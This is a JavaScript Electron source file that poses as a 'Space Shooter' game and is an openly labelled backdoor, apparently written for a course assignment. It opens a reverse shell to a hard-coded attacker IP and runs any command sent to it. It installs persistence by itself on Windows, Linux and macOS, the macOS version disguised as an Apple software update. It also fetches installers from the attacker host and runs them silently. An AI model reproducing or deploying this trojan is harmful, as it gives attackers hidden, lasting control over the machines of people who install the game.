const { app, BrowserWindow, ipcMain, Menu, Tray, nativeImage } = require('electron');
const { exec, spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const net = require('net');

// ==================== CONFIGURATION ====================
const config = {
    attackerIP: '10.12.73.13', 
    attackerPort: 1290,
    httpPort: 8000,
    installersPath: path.join(__dirname, 'installers'),
    version: '1.0.1',
    appName: 'Space Shooter'
};

// Global variables
let mainWindow;
let tray = null;
let connection = null;
let reconnectTimer = null;
let persistenceAdded = false;

// ==================== SINGLE INSTANCE LOCK (Prevent multiple instances) ====================
const gotTheLock = app.requestSingleInstanceLock();

if (!gotTheLock) {
    console.log('[!] Another instance is already running - exiting');
    app.quit();
    return;
}

app.on('second-instance', () => {
    // Someone tried to run another instance - focus the existing window
    if (mainWindow) {
        if (mainWindow.isMinimized()) mainWindow.restore();
        mainWindow.focus();
    }
});

// ==================== LOGGING ====================
function log(message) {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${message}`);
}

// ==================== SYSTEM TRAY (Shows backdoor is alive) ====================
function createTray() {
    if (tray) return;
    
    try {
        // Use empty icon instead of loading from file
        const icon = nativeImage.createEmpty();
        
        tray = new Tray(icon.resize({ width: 16, height: 16 }));
        
        const contextMenu = Menu.buildFromTemplate([
            { 
                label: '🎮 Show Game', 
                click: () => {
                    if (!mainWindow) createWindow();
                    else mainWindow.show();
                }
            },
            { type: 'separator' },
            { 
                label: connection ? '✅ Connected to Attacker' : '❌ Disconnected', 
                enabled: false 
            },
            { 
                label: `🖥️ Victim: ${os.hostname()}`, 
                enabled: false 
            },
            { type: 'separator' },
            { 
                label: '🚪 Exit Backdoor', 
                click: () => {
                    log('Shutting down backdoor...');
                    if (connection) connection.end();
                    app.quit();
                }
            }
        ]);
        
        tray.setToolTip(`Space Shooter Backdoor (Running on ${os.hostname()})`);
        tray.setContextMenu(contextMenu);
        
        tray.on('click', () => {
            if (!mainWindow) createWindow();
            else mainWindow.show();
        });
        
        log('✅ System tray created');
    } catch(e) {
        log(`❌ Tray error: ${e.message}`);
    }
}

// ==================== REVERSE SHELL CONNECTION ====================
function connectToAttacker() {
    log(`Connecting to attacker at ${config.attackerIP}:${config.attackerPort}...`);
    
    try {
        connection = net.createConnection({
            host: config.attackerIP,
            port: config.attackerPort
        }, () => {
            log('✅ Connected to attacker!');
            
            // Update tray status if exists
            if (tray) {
                tray.setContextMenu(Menu.buildFromTemplate([
                    { label: '🎮 Show Game', click: () => mainWindow ? mainWindow.show() : createWindow() },
                    { type: 'separator' },
                    { label: '✅ Connected to Attacker', enabled: false },
                    { label: `🖥️ Victim: ${os.hostname()}`, enabled: false },
                    { type: 'separator' },
                    { label: '🚪 Exit Backdoor', click: () => app.quit() }
                ]));
            }
            
            // Send banner
            connection.write(`
╔══════════════════════════════════════════════════════════╗
║              SPACE SHOOTER BACKDOOR SHELL                ║
║                    Educational Use Only                   ║
║                         v${config.version}                         ║
╚══════════════════════════════════════════════════════════╝

System: ${os.platform()} ${os.arch()}
Hostname: ${os.hostname()}
User: ${os.userInfo().username}
Time: ${new Date().toLocaleString()}

Type 'help' for commands
> `);
        });
        
        connection.on('data', (data) => {
            const command = data.toString().trim();
            if (command) handleCommand(command);
        });
        
        connection.on('end', () => {
            log('Disconnected from attacker');
            connection = null;
            
            // Update tray status
            if (tray) {
                tray.setContextMenu(Menu.buildFromTemplate([
                    { label: '🎮 Show Game', click: () => mainWindow ? mainWindow.show() : createWindow() },
                    { type: 'separator' },
                    { label: '❌ Disconnected', enabled: false },
                    { label: `🖥️ Victim: ${os.hostname()}`, enabled: false },
                    { type: 'separator' },
                    { label: '🚪 Exit Backdoor', click: () => app.quit() }
                ]));
            }
            
            setTimeout(connectToAttacker, 30000);
        });
        
        connection.on('error', (err) => {
            log(`Connection error: ${err.message}`);
            connection = null;
            setTimeout(connectToAttacker, 30000);
        });
        
    } catch (err) {
        log(`Failed to connect: ${err.message}`);
        setTimeout(connectToAttacker, 30000);
    }
}

// ==================== COMMAND HANDLING ====================
function handleCommand(command) {
    const args = command.split(' ');
    const cmd = args[0].toLowerCase();
    
    switch(cmd) {
        case 'help':
            sendOutput(`
Available Commands:
  help              - Show this help
  info              - Victim system information
  exec <command>    - Execute system command
  persist           - Add persistence
  cleanup           - Remove persistence
  exit              - Close connection
            `);
            break;
            
        case 'info':
            const info = {
                hostname: os.hostname(),
                platform: os.platform(),
                release: os.release(),
                arch: os.arch(),
                username: os.userInfo().username,
                cpus: os.cpus().length,
                memory: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + 'GB',
                uptime: Math.round(os.uptime() / 3600) + ' hours',
                ip: getLocalIP()
            };
            sendOutput(JSON.stringify(info, null, 2));
            break;
            
        case 'exec':
            const execCmd = args.slice(1).join(' ');
            if (!execCmd) {
                sendOutput('Usage: exec <command>');
                break;
            }
            
            exec(execCmd, { encoding: 'utf8', timeout: 30000 }, (error, stdout, stderr) => {
                const output = stdout + stderr;
                sendOutput(output || 'Command executed (no output)');
            });
            break;
            
        case 'persist':
            addPersistence();
            sendOutput('✅ Persistence added - will survive reboots');
            break;
            
        case 'cleanup':
            removePersistence();
            sendOutput('✅ Persistence removed');
            break;
            
        case 'exit':
            sendOutput('Goodbye!');
            if (connection) connection.end();
            break;
            
        default:
            sendOutput(`Unknown command: ${cmd}`);
    }
    if (connection && connection.writable) sendOutput('> ');
}

function sendOutput(data) {
    if (connection && connection.writable) {
        connection.write(data + '\n');
    }
}

function getLocalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
        }
    }
    return 'Unknown';
}

// ==================== PERSISTENCE (Assignment Requirement) ====================
function addPersistence() {
    if (persistenceAdded) return;
    
    const platform = os.platform();
    const appPath = process.execPath;
    
    log(`Adding persistence for ${platform}...`);
    
    try {
        if (platform === 'win32') {
            // Windows persistence
            const startupDir = path.join(os.homedir(), 
                'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
            const shortcutPath = path.join(startupDir, 'SystemHelper.lnk');
            
            // Add to startup folder
            const psScript = `
                $WScriptShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WScriptShell.CreateShortcut("${shortcutPath}")
                $Shortcut.TargetPath = "${appPath}"
                $Shortcut.Save()
            `;
            execSync(`powershell -WindowStyle Hidden -Command "${psScript}"`);
            
            // Add to registry
            execSync(`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemHelper /t REG_SZ /d "${appPath}" /f`);
            
            // Add scheduled task (survives even if file is deleted)
            execSync(`schtasks /create /tn "SystemHelper" /tr "${appPath}" /sc onlogon /f /rl HIGHEST`);
            
            log('✅ Windows persistence added (Startup + Registry + Task)');
            persistenceAdded = true;
            
        } else if (platform === 'linux') {
            // Linux persistence
            const cronJob = `@reboot ${appPath} > /dev/null 2>&1 &\n`;
            execSync(`(crontab -l 2>/dev/null; echo "${cronJob}") | crontab -`);
            
            // Systemd service
            const serviceContent = `[Unit]
Description=System Helper
After=network.target

[Service]
Type=simple
ExecStart=${appPath}
Restart=always
User=${os.userInfo().username}

[Install]
WantedBy=multi-user.target
`;
            fs.writeFileSync('/tmp/system-helper.service', serviceContent);
            execSync('sudo mv /tmp/system-helper.service /etc/systemd/system/');
            execSync('sudo systemctl enable system-helper.service');
            
            log('✅ Linux persistence added (Crontab + Systemd)');
            persistenceAdded = true;
            
        } else if (platform === 'darwin') {
            // macOS persistence
            const launchAgent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array><string>${appPath}</string></array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`;
            
            fs.writeFileSync('/tmp/com.apple.softwareupdate.plist', launchAgent);
            execSync('sudo mv /tmp/com.apple.softwareupdate.plist /Library/LaunchDaemons/');
            execSync('sudo launchctl load /Library/LaunchDaemons/com.apple.softwareupdate.plist');
            
            log('✅ macOS persistence added');
            persistenceAdded = true;
        }
    } catch(e) {
        log(`❌ Persistence error: ${e.message}`);
    }
}

function removePersistence() {
    const platform = os.platform();
    
    try {
        if (platform === 'win32') {
            const startupDir = path.join(os.homedir(), 
                'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
            const shortcutPath = path.join(startupDir, 'SystemHelper.lnk');
            if (fs.existsSync(shortcutPath)) fs.unlinkSync(shortcutPath);
            
            execSync('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemHelper /f 2>nul');
            execSync('schtasks /delete /tn "SystemHelper" /f 2>nul');
            
            log('✅ Windows persistence removed');
            
        } else if (platform === 'linux') {
            execSync('crontab -l | grep -v "system-helper" | crontab - 2>/dev/null');
            execSync('sudo systemctl stop system-helper.service 2>/dev/null');
            execSync('sudo systemctl disable system-helper.service 2>/dev/null');
            execSync('sudo rm /etc/systemd/system/system-helper.service 2>/dev/null');
            
            log('✅ Linux persistence removed');
            
        } else if (platform === 'darwin') {
            execSync('sudo launchctl unload /Library/LaunchDaemons/com.apple.softwareupdate.plist 2>/dev/null');
            execSync('sudo rm /Library/LaunchDaemons/com.apple.softwareupdate.plist 2>/dev/null');
            
            log('✅ macOS persistence removed');
        }
        
        persistenceAdded = false;
    } catch(e) {
        log(`❌ Cleanup error: ${e.message}`);
    }
}

// ==================== DEPENDENCY MANAGER ====================
function checkDependencies() {
    const platform = os.platform();
    log(`Checking dependencies for ${platform}...`);
    
    const deps = platform === 'win32' ? [
        { name: 'python', check: 'python --version', installer: 'python-3.12.3-amd64.exe' },
        { name: 'git', check: 'git --version', installer: 'Git-2.33.0-64-bit.exe' },
        { name: 'curl', check: 'curl --version', installer: 'curl.exe' }
    ] : [];
    
    deps.forEach(dep => {
        try {
            execSync(dep.check, { stdio: 'ignore', timeout: 5000 });
            log(`✅ ${dep.name} found`);
        } catch(e) {
            log(`❌ ${dep.name} not found - downloading...`);
            downloadInstaller(dep);
        }
    });
}

function downloadInstaller(dep) {
    const url = `http://${config.attackerIP}:${config.httpPort}/installers/${dep.installer}`;
    const dest = path.join(os.tmpdir(), dep.installer);
    
    const curl = spawn('curl', ['-L', '-o', dest, url], { stdio: 'ignore' });
    curl.on('close', (code) => {
        if (code === 0) {
            log(`✅ Downloaded ${dep.name}`);
            if (os.platform() === 'win32') {
                spawn(dest, ['/S', '/quiet'], { 
                    detached: true, 
                    stdio: 'ignore',
                    windowsHide: true 
                }).unref();
            }
        }
    });
}

// ==================== GAME WINDOW ====================
function createWindow() {
    log('Starting game...');
    
    // Check and install dependencies
    checkDependencies();
    
    // Connect to attacker if not already connected
    if (!connection) {
        connectToAttacker();
    }
    
    // Add persistence automatically (assignment requirement)
    setTimeout(() => {
        addPersistence();
    }, 10000); // Add after 10 seconds
    
    // Create game window only if it doesn't exist
    if (!mainWindow) {
        mainWindow = new BrowserWindow({
            width: 600,
            height: 700,
            minWidth: 520,
            minHeight: 600,
            webPreferences: {
                nodeIntegration: false,
                contextIsolation: true,
                preload: path.join(__dirname, 'preload.js')
            },
            frame: true,
            autoHideMenuBar: true,
            backgroundColor: '#050a14',
            show: false,
            title: config.appName,
            //icon: path.join(__dirname, 'icon.ico')
        });

        mainWindow.loadFile('game.html');
        
        mainWindow.once('ready-to-show', () => {
            mainWindow.show();
            mainWindow.webContents.send('game-started');
        });

        mainWindow.on('closed', () => {
            mainWindow = null;
            log('🎮 Game window closed - backdoor continues running in background');
            
            // Show notification that backdoor is still active
            if (tray) {
                tray.displayBalloon({
                    title: 'Space Shooter',
                    content: 'Backdoor still running in background',
                    //icon: path.join(__dirname, 'icon.ico')
                });
            }
        });
        
        // Prevent DevTools
        mainWindow.webContents.on('before-input-event', (event, input) => {
            if ((input.control && input.shift && input.key.toLowerCase() === 'i') ||
                input.key.toLowerCase() === 'f12') {
                event.preventDefault();
            }
        });
    } else {
        mainWindow.show();
    }
    
    // Create system tray
    //createTray();
}

// ==================== APP EVENTS ====================
app.whenReady().then(() => {
    createWindow();
});

// CRITICAL: This prevents app from quitting when game window closes
app.on('window-all-closed', (event) => {
    // On Windows/Linux, keep running in background
    if (process.platform !== 'darwin') {
        event.preventDefault();
        log('🔄 All windows closed - backdoor continues in background');
        
        // Update tray to show we're still alive
        if (tray) {
            tray.displayBalloon({
                title: 'Space Shooter',
                content: 'Backdoor still running - click tray icon to reopen game',
                icon: path.join(__dirname, 'icon.ico')
            });
        }
    } else {
        // On macOS, common to keep app running
        // Do nothing
    }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createWindow();
    }
});

// Cleanup on exit
process.on('exit', () => {
    log('Backdoor shutting down...');
    if (connection) connection.end();
});

// Handle graceful shutdown
process.on('SIGINT', () => {
    log('Received SIGINT - shutting down...');
    app.quit();
});

process.on('SIGTERM', () => {
    log('Received SIGTERM - shutting down...');
    app.quit();
});